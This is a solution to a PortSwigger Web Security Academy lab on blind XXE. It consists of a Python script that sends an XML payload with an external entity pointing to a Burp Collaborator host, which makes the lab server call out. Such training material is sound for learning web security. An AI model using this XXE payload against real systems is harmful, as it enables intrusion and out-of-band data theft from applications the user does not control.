# Lab: Blind XXE with out-of-band interaction

Link to lab: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction

## Solution
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'Host': '0a29008504040ad0c25425cc00f9008e.web-security-academy.net',
    'Content-Type': 'application/xml',
}

data = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://yikfn9un5au63ryrq5f0jfe1lsrjf93y.oastify.com"> ]><stockCheck><productId>&xxe;#1</productId><storeId>1</storeId></stockCheck>'

response = requests.post(
    'https://0a29008504040ad0c25425cc00f9008e.web-security-academy.net/product/stock',
    headers=headers,
    data=data,
    verify=False,
)

print(response.text)
```